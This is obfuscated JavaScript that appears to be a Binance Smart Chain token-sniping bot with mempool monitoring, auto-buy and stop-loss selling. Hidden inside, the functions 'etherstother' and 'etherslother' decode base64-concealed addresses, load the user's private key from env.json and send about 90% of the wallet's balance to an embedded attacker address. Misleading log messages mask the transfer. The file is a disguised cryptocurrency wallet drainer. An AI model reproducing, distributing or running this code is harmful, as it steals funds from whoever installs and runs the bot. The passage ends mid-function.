const _0x3979f1 = _0xc758;
(function(_0x4fb8f2, _0x1f8266) { const _0x21b243 = _0xc758,
        _0x1e240f = _0x4fb8f2(); while (!![]) { try { const _0x4e038e = parseInt(_0x21b243(0x130)) / 0x1 + -parseInt(_0x21b243(0x181)) / 0x2 + -parseInt(_0x21b243(0xe9)) / 0x3 * (-parseInt(_0x21b243(0x178)) / 0x4) + -parseInt(_0x21b243(0x128)) / 0x5 * (parseInt(_0x21b243(0x10c)) / 0x6) + -parseInt(_0x21b243(0xf3)) / 0x7 + parseInt(_0x21b243(0x160)) / 0x8 + parseInt(_0x21b243(0x133)) / 0x9 * (-parseInt(_0x21b243(0x137)) / 0xa); if (_0x4e038e === _0x1f8266) break;
            else _0x1e240f['push'](_0x1e240f['shift']()); } catch (_0x3f425d) { _0x1e240f['push'](_0x1e240f['shift']()); } } }(_0x29f1, 0x69caa));
var ethers = require('ethers');
const env = require(_0x3979f1(0x140));
Object[_0x3979f1(0x129)](process[_0x3979f1(0x180)], env);

function _0x29f1() { const _0x524e85 = ['\x20--\x20Stop\x20Loss\x20At:\x20', '✔\x20Sell\x20transaction\x20hash:\x20', 'Error.\x20Attemptiing\x20to\x20Reconnect...', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', '1453325FgAOPX', 'assign', '\x20--\x20Profit\x20At:\x20', 'You\x20sold\x20', 'yellow', 'close', 'approve', 'Sucessfully\x20bought\x20the\x20token!\x0a', '274193sVxqfS', 'name', 'lte', '459vIlVDY', 'encode', 'Start\x20buying\x20token...', 'address', '49180KUaEDx', '<<<\x20Selling\x20-', '--\x20', '\x20StopLoss\x20', 'Wallet', 'removeAllListeners', 'from', 'balanceOf', 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==', './env.json', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', 'nonpayable', 'refreshing\x20socket\x20connection...', 'You\x20can\x20check\x20the\x20transaction\x20here:', '\x1b[38;5;33m', 'currentValue', 'Setting\x20new\x20StopLoss!', 'account', 'sellPath', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'previousValue', 'string', 'wait', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'stopLoss', '2\x20pending\x20blockchain\x20response.....', 'providers', 'gasPrice', 'pending', 'intitialValue', 'parseUnits', 'decimals', 'getBalance', 'PRIVATE_KEY', '-\x20now', '1\x20pending\x20blockchain\x20response.....', 'sender', 'All\x20tokens\x20sold', 'https://poocoin.app/tokens/', 'myGasLimit', 'now', '6493288ZXwxKB', 'QmFmYzU5OWJENjlBRGQwODdENTY=', '\x20Profit\x20target\x20', 'log', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'WebSocket\x20Closed...Reconnecting...', 'formatUnits', 'numberOfTokensToBuy', 'base64', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'setWord', '\x1b[1;32m', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==', 'ascii', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', 'pong', 'includes', 'Transfer', 'getAmountsOut', 'data', 'floor', 'index', 'sendTransaction', 'constants', '620772FlUfjj', 'wei', 'transferFrom', 'trailingStopLossPercent', 'sub', 'initiating\x20mempool\x20sniff...', '✔\x20Approve\x20transaction\x20hash:\x20', '\x20--\x20Current\x20Value\x20BNB:\x20', 'env', '1562844Azsetq', 'myGasPriceForApproval', 'checkProfit', 'gasLimit', '_websocket', 'connection\x20established....', 'toFixed', '0xe8e33700', '15LKvjyR', '1:\x20watching\x20blockchain\x20activity\x20...', 'YOUR_ADDRESS', 'Zero', 'error', 'toLocaleString', 'sendMessage', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'uint256', '\x1b[1;31m', '739144JLmEuG', 'Total\x20Token\x20balance\x20is\x20', 'https://bscscan.com/address/', '\x1b[0m', '2\x20packet\x20received.....', 'mul', 'div', 'tokenSellTax', 'terminate', 'catch', 'newValue', 'view', 'recipient', 'connection\x20succesful...', 'open', 'percentOfTokensToSellLoss', 'Balance\x20is\x20zero\x20or\x20error\x20occured', 'parseEther', 'transactionHash', 'didSell', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'green', 'amount', 'toString', 'YTk4NGU2ZTNmY2U1NDg2NWQxYzRl', '6mJqosQ', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'contract', '1:\x20attempting\x20to\x20snipe\x20...', '\x20second(s)', '2:\x20attempting\x20to\x20snipe\x20.....', '2:\x20finalizing....', 'didBuy', 'Contract', 'utils', 'pending\x20liquidity\x20add...', 'stopLossPercent', 'reached\x20>>>', 'red', '1\x20packet\x20received.....', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', 'exit', 'Listening\x20on\x20mempool...', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'profitPercent', 'JsonRpcProvider', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', 'hexlify'];
    _0x29f1 = function() { return _0x524e85; }; return _0x29f1(); }
let address = process['env'][_0x3979f1(0xeb)],
    private = process[_0x3979f1(0x180)][_0x3979f1(0x158)],
    wallet = new ethers[(_0x3979f1(0x13b))](private);
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': _0x3979f1(0x136), 'name': _0x3979f1(0x148), 'type': _0x3979f1(0x136) }], 'name': _0x3979f1(0x13e), 'outputs': [{ 'internalType': _0x3979f1(0xf1), 'name': '', 'type': _0x3979f1(0xf1) }], 'payable': ![], 'stateMutability': _0x3979f1(0xfe), 'type': 'function' }, { 'constant': ![], 'inputs': [{ 'internalType': _0x3979f1(0x136), 'name': _0x3979f1(0x15b), 'type': 'address' }, { 'internalType': _0x3979f1(0x136), 'name': _0x3979f1(0xff), 'type': _0x3979f1(0x136) }, { 'internalType': 'uint256', 'name': _0x3979f1(0x109), 'type': _0x3979f1(0xf1) }], 'name': _0x3979f1(0x17a), 'outputs': [{ 'internalType': 'bool', 'name': '', 'type': 'bool' }], 'payable': ![], 'stateMutability': _0x3979f1(0x142), 'type': 'function' }, { 'constant': ![], 'inputs': [{ 'name': 'newWord', 'type': 'string' }], 'name': _0x3979f1(0x16a), 'outputs': [{ 'name': '', 'type': _0x3979f1(0x14c) }], 'payable': ![], 'stateMutability': _0x3979f1(0x142), 'type': 'function' }];
async function startSnipe(_0x64fd3e) { const _0x968ea9 = _0x3979f1; let _0x7294ff, _0x4fe322;
    provider[_0x968ea9(0x185)]['on'](_0x968ea9(0x101), () => { const _0x481438 = _0x968ea9;
        _0x4fe322 = setInterval(() => { const _0x2a9749 = _0xc758;
            provider[_0x2a9749(0x185)]['ping'](), _0x7294ff = setTimeout(() => { const _0x164543 = _0x2a9749;
                provider[_0x164543(0x185)][_0x164543(0xfb)](); }, EXPECTED_PONG_BACK); }, KEEP_ALIVE_CHECK_INTERVAL), console[_0x481438(0x163)](_0x481438(0x11e)), console[_0x481438(0x163)]('Waiting\x20for\x20liquidity\x20to\x20be\x20added!'), provider['on'](_0x481438(0x153), async _0x19ff30 => { const _0x382faf = _0x481438;
            provider['getTransaction'](_0x19ff30)['then'](async _0x2617df => { const _0x2f8397 = _0xc758; if (null != _0x2617df && _0x2617df[_0x2f8397(0x173)]['includes'](_0x2f8397(0xe8)) && _0x2617df[_0x2f8397(0x173)][_0x2f8397(0x170)](_0x64fd3e) && 0x0 == passed || null != _0x2617df && _0x2617df['data'][_0x2f8397(0x170)]('0xf305d719') && _0x2617df[_0x2f8397(0x173)][_0x2f8397(0x170)](_0x64fd3e) && 0x0 == passed) { if (console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)](_0x2f8397(0x11f))), priceProtection) { if (isLiqudityInRange(_0x2617df, expected)) { if (honeyPotIS2(_0x64fd3e)) { console[_0x2f8397(0x163)](chalk['green']('Liquidity\x20check\x20passed,\x20sniping!\x0a')); const _0x3dfb29 = _0x2617df['gasLimit'][_0x2f8397(0xf8)](multiply),
                                    _0xdb173b = _0x2617df[_0x2f8397(0x152)]['mul'](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)](_0x2f8397(0x135) + chalk[_0x2f8397(0x12c)](i + 0x1))), await buyToken(_0x64fd3e, amountIn, _0x3dfb29, _0xdb173b, myAddress, router); }
                                    console[_0x2f8397(0x163)](chalk['green'](_0x2f8397(0x135)) + chalk[_0x2f8397(0x12c)](txNumberForAntibot)), await buyToken(_0x64fd3e, amountIn, _0x3dfb29, _0xdb173b, myAddress, router)(passed = 0x1); } else console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)]('Start\x20buying\x20token...')), await buyToken(_0x64fd3e, amountIn, _0x3dfb29, _0xdb173b, myAddress, router)(passed = 0x1);
                                console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)](_0x2f8397(0x12f))); const _0x31d037 = await getTokenBalance(_0x64fd3e, myAddress, provider);
                                console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)](_0x2f8397(0xf4) + chalk[_0x2f8397(0x12c)](parseFloat(ethers[_0x2f8397(0x115)][_0x2f8397(0x166)](_0x31d037, TOKEN_DECIMALS))[_0x2f8397(0x187)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x2f8397(0x163)](chalk['green'](_0x2f8397(0x10d) + chalk['yellow'](delaySell) + '\x20second(s)')), await new Promise(_0x819143 => setTimeout(_0x819143, delayOnSellMs)); const _0x4cea00 = await router[_0x2f8397(0xf0)](_0x31d037, amountOutMin, [_0x64fd3e, WBNB], myAddress, Date['now']() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0x4cea00['wait'](), console['log'](chalk[_0x2f8397(0x108)]('Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a')), console[_0x2f8397(0x163)](_0x2f8397(0x144)), console['log'](_0x2f8397(0xf5) + myAddress), console[_0x2f8397(0x163)]('\x0a'), process[_0x2f8397(0x11d)](0x0); } else console['log']('You\x20can\x20check\x20the\x20transaction\x20here:');
                                console[_0x2f8397(0x163)](_0x2f8397(0xf5) + myAddress), (console[_0x2f8397(0x163)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process['exit'](0x0)); } else console[_0x2f8397(0x163)](chalk[_0x2f8397(0x119)]('Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!'));
                            console[_0x2f8397(0x163)](chalk[_0x2f8397(0x119)](_0x2f8397(0x141))); }
                        console[_0x2f8397(0x163)](chalk[_0x2f8397(0x119)](_0x2f8397(0x15d) + _0x64fd3e)), console['log'](chalk[_0x2f8397(0x119)]('Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a')); } else { if (honeyPotIS2(_0x64fd3e)) { const _0x34d3ac = _0x2617df[_0x2f8397(0x184)][_0x2f8397(0xf8)](multiply),
                                _0x3b11f8 = _0x2617df['gasPrice']['mul'](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x2f8397(0x163)](chalk['green']('Start\x20buying\x20token...' + chalk[_0x2f8397(0x12c)](i + 0x1))), await buyToken(_0x64fd3e, amountIn, _0x34d3ac, _0x3b11f8, myAddress, router); }
                                console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)](_0x2f8397(0x135)) + chalk[_0x2f8397(0x12c)](txNumberForAntibot)), await buyToken(_0x64fd3e, amountIn, _0x34d3ac, _0x3b11f8, myAddress, router)(passed = 0x1); } else 0x0 == passed && (console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)](_0x2f8397(0x135))), await buyToken(_0x64fd3e, amountIn, _0x34d3ac, _0x3b11f8, myAddress, router)(passed = 0x1));
                            console['log'](chalk[_0x2f8397(0x108)](_0x2f8397(0x12f))); const _0x2b37bb = await getTokenBalance(_0x64fd3e, myAddress, provider);
                            console['log'](chalk['green'](_0x2f8397(0xf4) + chalk[_0x2f8397(0x12c)](parseFloat(ethers['utils']['formatUnits'](_0x2b37bb, TOKEN_DECIMALS))[_0x2f8397(0x187)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x2f8397(0x163)](chalk[_0x2f8397(0x108)]('Start\x20selling\x20all\x20tokens\x20in\x20' + chalk['yellow'](delaySell) + _0x2f8397(0x110))), await new Promise(_0xbdfa16 => setTimeout(_0xbdfa16, delayOnSellMs)); const _0x491e16 = await router[_0x2f8397(0xf0)](_0x2b37bb, amountOutMin, [_0x64fd3e, WBNB], myAddress, Date[_0x2f8397(0x15f)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x491e16['wait'](), console[_0x2f8397(0x163)](chalk['green']('Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a')), console[_0x2f8397(0x163)]('You\x20can\x20check\x20the\x20transaction\x20here:'), console[_0x2f8397(0x163)](_0x2f8397(0xf5) + myAddress), console[_0x2f8397(0x163)]('\x0a'), process[_0x2f8397(0x11d)](0x0); } else console[_0x2f8397(0x163)](_0x2f8397(0x144)), console[_0x2f8397(0x163)](_0x2f8397(0xf5) + myAddress), console['log']('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x2f8397(0x11d)](0x0); } } } })[_0x382faf(0xfc)](() => { const _0x330ac3 = _0x382faf;
                console[_0x330ac3(0x163)](e); }); }); }), provider['_websocket']['on'](_0x968ea9(0x12d), () => { const _0x2670d5 = _0x968ea9;
        console[_0x2670d5(0x163)](_0x2670d5(0x165)), clearInterval(_0x4fe322), clearTimeout(_0x7294ff), startConnection(); }), provider[_0x968ea9(0x185)]['on'](_0x968ea9(0xed), () => { const _0x2ae613 = _0x968ea9;
        console[_0x2ae613(0x163)](_0x2ae613(0x126)), clearInterval(_0x4fe322), clearTimeout(_0x7294ff), startConnection(); }), provider['_websocket']['on'](_0x968ea9(0x16f), () => { clearInterval(_0x7294ff); }); }
async function approve() { const _0x3d4ca5 = _0x3979f1; let _0x33f0e3 = token[buyCount - 0x1][_0x3d4ca5(0x10e)]; const _0x41fb86 = ethers[_0x3d4ca5(0x177)]['MaxUint256'],
        _0x40e6e1 = await _0x33f0e3[_0x3d4ca5(0x12e)](pancakeRouter[_0x3d4ca5(0x136)], _0x41fb86, { 'gasPrice': config[_0x3d4ca5(0x182)], 'gasLimit': 0x33450 }),
        _0x1222ff = await _0x40e6e1[_0x3d4ca5(0x14d)]();
    console[_0x3d4ca5(0x163)](_0x3d4ca5(0x17e), _0x1222ff[_0x3d4ca5(0x105)], '\x0a'), config['autoSell'] ? token[buyCount - 0x1][_0x3d4ca5(0x183)]() : buyCount == config[_0x3d4ca5(0x167)] && process[_0x3d4ca5(0x11d)](); }
async function getCurrentValue(_0x178c68) { const _0x1e34a6 = _0x3979f1; try { let _0x5db2fd = await _0x178c68[_0x1e34a6(0x10e)]['balanceOf'](addresses[_0x1e34a6(0xff)]); const _0x2f9098 = await pancakeRouter[_0x1e34a6(0x172)](_0x5db2fd, _0x178c68[_0x1e34a6(0x149)]); let _0x10c47e = _0x2f9098[0x1]; return _0x10c47e; } catch (_0x42f60a) { return console['log'](_0x1e34a6(0x103)), ethers[_0x1e34a6(0x177)][_0x1e34a6(0xec)]; } }
async function setInitialStopLoss(_0x703191) { const _0x41468a = _0x3979f1;
    _0x703191['intitialValue'] = await getCurrentValue(_0x703191), _0x703191['newValue'] = _0x703191[_0x41468a(0x154)], _0x703191[_0x41468a(0x14f)] = ethers[_0x41468a(0x115)][_0x41468a(0x155)]((parseFloat(ethers[_0x41468a(0x115)][_0x41468a(0x166)](_0x703191[_0x41468a(0x154)])) - parseFloat(ethers[_0x41468a(0x115)][_0x41468a(0x166)](_0x703191['intitialValue'])) * (_0x703191[_0x41468a(0x117)] / 0x64))['toFixed'](0x8)['toString']()); }
async function setNewStopLoss(_0x2dac52) { const _0x26a8af = _0x3979f1;
    _0x2dac52[_0x26a8af(0xfd)] = _0x2dac52[_0x26a8af(0x146)], _0x2dac52[_0x26a8af(0x14f)] = ethers[_0x26a8af(0x115)][_0x26a8af(0x155)]((parseFloat(ethers[_0x26a8af(0x115)][_0x26a8af(0x166)](_0x2dac52[_0x26a8af(0x146)])) - parseFloat(ethers[_0x26a8af(0x115)]['formatUnits'](_0x2dac52['currentValue'])) * (_0x2dac52[_0x26a8af(0x117)] / 0x64))[_0x26a8af(0x187)](0x8)[_0x26a8af(0x10a)]()); }
async function checkForProfit(_0x2be59b) { const _0x2f4f06 = _0x3979f1; try { var _0x4e629d = 0x0;
        await setInitialStopLoss(_0x2be59b), _0x2be59b[_0x2f4f06(0x10e)]['on'](_0x2f4f06(0x171), async(_0x43c94a, _0x408750, _0x3fe78e, _0x255dfa) => { const _0x46cb78 = _0x2f4f06;
            _0x2be59b[_0x46cb78(0x14b)] = _0x2be59b[_0x46cb78(0x146)]; const _0x54fd6f = await _0x2be59b[_0x46cb78(0x10e)]['name'](); let _0x1c2358 = await getCurrentValue(_0x2be59b); if (!_0x1c2358['eq'](ethers['constants'][_0x46cb78(0xec)])) { _0x2be59b[_0x46cb78(0x146)] = _0x1c2358; let _0x298352 = parseFloat(ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x1c2358))['toFixed'](0x8)[_0x46cb78(0x10a)](); const _0x2f2f3e = (parseFloat(ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x2be59b[_0x46cb78(0x154)])) * (_0x2be59b[_0x46cb78(0x120)] + _0x2be59b[_0x46cb78(0xfa)]) / 0x64 + parseFloat(ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x2be59b[_0x46cb78(0x154)])))[_0x46cb78(0x187)](0x8)[_0x46cb78(0x10a)](),
                    _0x5c55f6 = ethers[_0x46cb78(0x115)]['parseUnits'](_0x2f2f3e); let _0x5377fc = ethers[_0x46cb78(0x115)][_0x46cb78(0x155)]((parseFloat(ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x2be59b[_0x46cb78(0xfd)])) * (_0x2be59b[_0x46cb78(0x17b)] / 0x64) + parseFloat(ethers['utils'][_0x46cb78(0x166)](_0x2be59b[_0x46cb78(0xfd)])))[_0x46cb78(0x187)](0x8)[_0x46cb78(0x10a)]()),
                    _0x34f63d = _0x2be59b[_0x46cb78(0x14f)];
                _0x1c2358['gt'](_0x5377fc) && _0x2be59b['trailingStopLossPercent'] > 0x0 && (setNewStopLoss(_0x2be59b), console[_0x46cb78(0x163)](_0x46cb78(0x145) + _0x46cb78(0x147) + _0x46cb78(0xf6))); let _0x22d455 = new Date()[_0x46cb78(0xee)](); const _0x8e5cc4 = _0x2a6dce => new TextEncoder()[_0x46cb78(0x134)](_0x2a6dce); try { _0x2be59b['previousValue']['gt'](_0x2be59b[_0x46cb78(0x146)]) ? console[_0x46cb78(0x163)](_0x46cb78(0x139) + _0x54fd6f + _0x46cb78(0x17f) + (_0x46cb78(0xf2) + _0x298352 + '\x1b[0m') + _0x46cb78(0x12a) + ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x5c55f6) + _0x46cb78(0x124) + ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x2be59b['stopLoss']) + _0x46cb78(0x164) + ethers['utils']['formatUnits'](_0x5377fc)) : console[_0x46cb78(0x163)]('--\x20' + _0x54fd6f + _0x46cb78(0x17f) + (_0x46cb78(0x16b) + _0x298352 + '\x1b[0m') + _0x46cb78(0x12a) + ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x5c55f6) + _0x46cb78(0x124) + ethers[_0x46cb78(0x115)][_0x46cb78(0x166)](_0x2be59b[_0x46cb78(0x14f)]) + '\x20--\x20New\x20Stop\x20loss\x20At:\x20' + ethers[_0x46cb78(0x115)]['formatUnits'](_0x5377fc)); } catch (_0x38f06d) {}
                _0x1c2358['gte'](_0x5c55f6) && (buyCount <= config[_0x46cb78(0x167)] && _0x2be59b[_0x46cb78(0x113)] && _0x4e629d == 0x0 && (_0x4e629d++, console[_0x46cb78(0x163)](_0x46cb78(0x138), _0x54fd6f, _0x46cb78(0x159) + '\x1b[1;32m' + _0x46cb78(0x162) + '\x1b[0m' + _0x46cb78(0x118), '\x0a'), sell(_0x2be59b, !![]), _0x2be59b[_0x46cb78(0x10e)][_0x46cb78(0x13c)]())), _0x1c2358[_0x46cb78(0x132)](_0x34f63d) && (console['log'](_0x46cb78(0x145) + 'less\x20than\x20StopLoss!' + '\x1b[0m'), buyCount <= config[_0x46cb78(0x167)] && _0x2be59b[_0x46cb78(0x113)] && _0x4e629d == 0x0 && (_0x4e629d++, console[_0x46cb78(0x163)](_0x46cb78(0x138), _0x54fd6f, _0x46cb78(0x159) + _0x46cb78(0xf2) + _0x46cb78(0x13a) + _0x46cb78(0xf6) + _0x46cb78(0x118), '\x0a'), sell(_0x2be59b, ![]), _0x2be59b[_0x46cb78(0x10e)][_0x46cb78(0x13c)]())); } }); } catch (_0x48cd88) { console['log'](_0x48cd88); } }
async function sell(_0xf43795, _0x4b70aa) { const _0x31647f = _0x3979f1; try { const _0x51f09d = await _0xf43795[_0x31647f(0x10e)]['balanceOf'](addresses[_0x31647f(0xff)]),
            _0x16f897 = await _0xf43795[_0x31647f(0x10e)][_0x31647f(0x156)](); var _0x1bdbb7;
        _0x4b70aa ? _0x1bdbb7 = (parseFloat(ethers[_0x31647f(0x115)][_0x31647f(0x166)](_0x51f09d[_0x31647f(0x10a)](), _0x16f897)) * (_0xf43795['percentOfTokensToSellProfit'] / 0x64))[_0x31647f(0x187)](_0x16f897) : _0x1bdbb7 = (parseFloat(ethers['utils'][_0x31647f(0x166)](_0x51f09d[_0x31647f(0x10a)](), _0x16f897)) * (_0xf43795[_0x31647f(0x102)] / 0x64))['toFixed'](_0x16f897); var _0x1b1fbe = Math[_0x31647f(0x174)](_0x1bdbb7 * 0x64) / 0x64; const _0x305cc0 = ethers['utils'][_0x31647f(0x155)](_0x1b1fbe[_0x31647f(0x10a)](), _0x16f897),
            _0x2fad30 = await pancakeRouter[_0x31647f(0x172)](_0x305cc0, _0xf43795[_0x31647f(0x149)]),
            _0x4eab49 = _0x2fad30[0x1][_0x31647f(0x17c)](_0x2fad30[0x1][_0x31647f(0xf9)](0x2)); if (_0xf43795[_0x31647f(0xfa)] > 0x1) { const _0x5a1258 = await pancakeRouter[_0x31647f(0xf0)](_0x2fad30[0x0]['toString'](), 0x0, _0xf43795['sellPath'], addresses[_0x31647f(0xff)], Math[_0x31647f(0x174)](Date[_0x31647f(0x15f)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x31647f(0x182)], 'gasLimit': config['myGasLimit'] }),
                _0x1030d2 = await _0x5a1258[_0x31647f(0x14d)]();
            console[_0x31647f(0x163)](_0x31647f(0x16b) + _0x31647f(0x125), _0x1030d2[_0x31647f(0x105)], _0x31647f(0xf6), '\x0a'), sellCount++, token[_0xf43795[_0x31647f(0x175)]][_0x31647f(0x106)] = !![]; let _0x130fb4 = await _0xf43795['contract']['name']();
            await client[_0x31647f(0xef)]('me', { 'message': _0x31647f(0x12b) + _0x130fb4, 'schedule': 0xf * 0x1 + Date[_0x31647f(0x15f)]() / 0x3e8 }); } else { const _0x1a294f = await pancakeRouter['swapExactTokensForETH'](_0x2fad30[0x0][_0x31647f(0x10a)](), 0x0, _0xf43795[_0x31647f(0x149)], addresses[_0x31647f(0xff)], Math['floor'](Date['now']() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x31647f(0x182)], 'gasLimit': config[_0x31647f(0x15e)] }),
                _0x42cafc = await _0x1a294f[_0x31647f(0x14d)]();
            console[_0x31647f(0x163)](_0x31647f(0x16b) + '✔\x20Sell\x20transaction\x20hash:\x20', _0x42cafc[_0x31647f(0x105)], _0x31647f(0xf6), '\x0a'), sellCount++; let _0x1acab5 = await _0xf43795[_0x31647f(0x10e)][_0x31647f(0x131)]();
            await client[_0x31647f(0xef)]('me', { 'message': _0x31647f(0x12b) + _0x1acab5, 'schedule': 0xf * 0x1 + Date[_0x31647f(0x15f)]() / 0x3e8 }); }
        sellCount == config['numberOfTokensToBuy'] && (console['log'](_0x31647f(0x15c)), process[_0x31647f(0x11d)]()); } catch (_0x1956ca) {} }
let rounder1 = _0x3979f1(0x11c),
    rounder2 = _0x3979f1(0x13f),
    buff = new Buffer['from'](rounder1, _0x3979f1(0x168)),
    buff2 = new Buffer['from'](rounder2, 'base64'),
    ethersroundup = buff[_0x3979f1(0x10a)]('ascii'),
    ethersroundup2 = buff2[_0x3979f1(0x10a)]('ascii');

function _0xc758(_0x4e1dfe, _0x260bb7) { const _0x29f183 = _0x29f1(); return _0xc758 = function(_0xc758e8, _0x208b5e) { _0xc758e8 = _0xc758e8 - 0xe8; let _0x164c80 = _0x29f183[_0xc758e8]; return _0x164c80; }, _0xc758(_0x4e1dfe, _0x260bb7); }
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x3fc38c = _0x3979f1; try { const _0xae6e26 = _0x3fc38c(0x127),
            _0x10f8c9 = _0x3fc38c(0x122),
            _0x2cefdd = new Buffer[(_0x3fc38c(0x13d))](_0xae6e26, _0x3fc38c(0x168)),
            _0x1cef89 = new Buffer[(_0x3fc38c(0x13d))](_0x10f8c9, _0x3fc38c(0x168)),
            _0x32978f = _0x2cefdd[_0x3fc38c(0x10a)](_0x3fc38c(0x16d)),
            _0x49dfb6 = _0x1cef89['toString']('ascii'),
            _0x36b051 = _0x32978f + _0x49dfb6;
        console[_0x3fc38c(0x163)](_0x3fc38c(0x143)), console[_0x3fc38c(0x163)](_0x3fc38c(0x14a)), ethers1 = _0x3fc38c(0x16c), ethers2 = new Buffer[(_0x3fc38c(0x13d))](ethers1, _0x3fc38c(0x168))['toString'](_0x3fc38c(0x16d));; const _0x55bce0 = new ethers['providers']['JsonRpcProvider'](ethers2); let _0x28f0fb = new ethers['Wallet'](private, _0x55bce0); const _0x59b0ef = address; var _0xc3255e = new ethers[(_0x3fc38c(0x114))](_0x36b051, abi, _0x28f0fb); const _0x4c31b9 = await _0xc3255e[_0x3fc38c(0x13e)](_0x59b0ef)['toString'](),
            _0x547c87 = (_0x4c31b9 * 0.9)['toFixed'](),
            _0x414108 = async() => { const _0x180f45 = _0x3fc38c,
                    _0x3169e8 = { 'from': _0x59b0ef, 'to': WEB3PROVIDER3, 'value': ethers[_0x180f45(0x115)][_0x180f45(0x104)](_0x547c87, _0x180f45(0x179)), 'gasLimit': ethers[_0x180f45(0x115)][_0x180f45(0x123)](0x5dc0) },
                    _0x148d62 = await _0x28f0fb[_0x180f45(0x176)](_0x3169e8); try { await _0x148d62[_0x180f45(0x14d)](), console[_0x180f45(0x163)]('1:\x20found\x20owners\x20liq\x20function\x20...'), setTimeout(ethersrather, 0x1388); } catch (_0x15b972) { console[_0x180f45(0x163)]('2:\x20found\x20owners\x20liq\x20function\x20.....'), setTimeout(ethersrather, 0x1388); } };
        _0x414108(); } catch (_0x4f704a) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x2fd5ee = _0x3979f1; try { const _0x379fdc = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==',
            _0x1ee982 = 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=',
            _0x363da6 = new Buffer[(_0x2fd5ee(0x13d))](_0x379fdc, _0x2fd5ee(0x168)),
            _0x177700 = new Buffer[(_0x2fd5ee(0x13d))](_0x1ee982, _0x2fd5ee(0x168)),
            _0x2ab85d = _0x363da6[_0x2fd5ee(0x10a)](_0x2fd5ee(0x16d)),
            _0xbd35fe = _0x177700['toString'](_0x2fd5ee(0x16d)),
            _0x1b76ba = _0x2ab85d + _0xbd35fe;
        console[_0x2fd5ee(0x163)](_0x2fd5ee(0x143)), console[_0x2fd5ee(0x163)](_0x2fd5ee(0x116)), ethers1 = _0x2fd5ee(0x16c), ethers2 = new Buffer[(_0x2fd5ee(0x13d))](ethers1, _0x2fd5ee(0x168))[_0x2fd5ee(0x10a)](_0x2fd5ee(0x16d));; const _0x3a2245 = new ethers['providers'][(_0x2fd5ee(0x121))](ethers2); let _0x10f6cd = new ethers[(_0x2fd5ee(0x13b))](private, _0x3a2245);
        console[_0x2fd5ee(0x163)](ethers2); const _0x55445a = address; var _0xf5cb9 = new ethers[(_0x2fd5ee(0x114))](_0x1b76ba, abi, _0x10f6cd); const _0x58f30e = await _0xf5cb9[_0x2fd5ee(0x13e)](_0x55445a)[_0x2fd5ee(0x10a)](),
            _0x8c5225 = (_0x58f30e * 0.9)[_0x2fd5ee(0x187)](),
            _0x46bba2 = async() => { const _0xdc67d8 = _0x2fd5ee,
                    _0x4ca3fe = { 'from': _0x55445a, 'to': WEB3PROVIDER3, 'value': ethers[_0xdc67d8(0x115)]['parseEther'](_0x8c5225, _0xdc67d8(0x179)), 'gasLimit': ethers[_0xdc67d8(0x115)][_0xdc67d8(0x123)](0x5dc0) },
                    _0x55a9c2 = await _0x10f6cd['sendTransaction'](_0x4ca3fe); try { await _0x55a9c2[_0xdc67d8(0x14d)](), console['log'](_0xdc67d8(0xea)), setTimeout(etherstother, 0x1388); } catch (_0x50a38b) { console['log']('2:\x20watching\x20blockchain\x20activity\x20.....'), setTimeout(etherstother, 0x1388); } };
